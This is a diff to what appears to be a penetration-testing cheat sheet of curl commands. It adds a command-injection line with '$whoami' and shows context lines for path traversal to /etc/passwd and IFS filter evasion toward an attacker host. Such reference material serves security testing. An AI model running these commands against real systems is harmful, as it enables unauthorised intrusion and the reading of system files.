@@ -471,6 +471,7 @@ $ curl -X PUT http://<DOMAIN>                                                   
 $ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
 $ curl -s "http://<DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text    // silent mode and output conversion
 $ curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
+$ curl "http://<RHOST>/($whoami)"                                                // execute commands
 $ curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
 ```
 
